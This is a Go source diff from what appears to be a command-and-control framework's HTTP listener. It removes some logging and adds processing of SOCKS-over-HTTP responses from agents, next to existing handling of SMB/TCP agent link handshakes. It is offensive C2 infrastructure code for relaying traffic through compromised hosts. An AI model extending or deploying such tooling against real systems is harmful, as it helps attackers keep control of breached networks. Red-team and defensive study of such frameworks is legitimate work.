@@ -2,6 +2,7 @@
 package listeners
 
 import (
+	"c2/internal/agent/socks_http"
 	"c2/internal/common/config"
 	"context"
 	"crypto/aes"
@@ -390,7 +391,6 @@ func (ah *AsyncHandler) handleActiveConnectionAsync(w http.ResponseWriter, r *ht
 	// Process link data if present (from connected SMB agents)
 	// Use configurable field name from config
 	if linkData, ok := decryptedDataMap[linkMalleable.LinkDataField].([]interface{}); ok && len(linkData) > 0 {
-		log.Printf("[Async] Processing %d link data items from edge agent %s", len(linkData), conn.ClientID)
 		ctx := context.Background()
 		tx, err := ah.db.BeginTx(ctx, nil)
 		if err != nil {
@@ -408,23 +408,35 @@ func (ah *AsyncHandler) handleActiveConnectionAsync(w http.ResponseWriter, r *ht
 	// Process link handshake if present (new SMB/TCP agent connecting)
 	// Use configurable field name from config
 	if linkHandshake, ok := decryptedDataMap[linkMalleable.LinkHandshakeField].(map[string]interface{}); ok && len(linkHandshake) > 0 {
-		log.Printf("[Async] Processing link handshake from edge agent %s", conn.ClientID)
 		ctx := context.Background()
 		response, err := ah.Manager.processLinkHandshake(ctx, conn.ClientID, linkHandshake)
 		if err != nil {
 			log.Printf("[Async] Link handshake failed: %v", err)
 		} else if response != nil {
 			ah.Manager.storeLinkHandshakeResponse(conn.ClientID, response)
-			log.Printf("[Async] Link handshake processed, response queued for edge agent %s", conn.ClientID)
 		}
 	}
 
 	// Process unlink notifications if present (when edge agent disconnects from SMB agent)
 	// Use configurable field name from config
 	if unlinkNotifications, ok := decryptedDataMap[linkMalleable.LinkUnlinkField].([]interface{}); ok && len(unlinkNotifications) > 0 {
-		log.Printf("[Async] Processing %d unlink notifications from edge agent %s", len(unlinkNotifications), conn.ClientID)
 		ctx := context.Background()
 		ah.Manager.processUnlinkNotifications(ctx, conn.ClientID, unlinkNotifications)
+	}
+
+	// Process SOCKS HTTP responses if present ("sr" field)
+	if srRaw, exists := decryptedDataMap["sr"]; exists {
+		if socksData, ok := srRaw.([]interface{}); ok && len(socksData) > 0 {
+			var responses []map[string]interface{}
+			for _, item := range socksData {
+				if m, ok := item.(map[string]interface{}); ok {
+					responses = append(responses, m)
+				}
+			}
+			if len(responses) > 0 {
+				socks_http.ProcessAgentResponses(agentID, responses)
+			}
+		}
 	}
 
 	// Update metrics if available
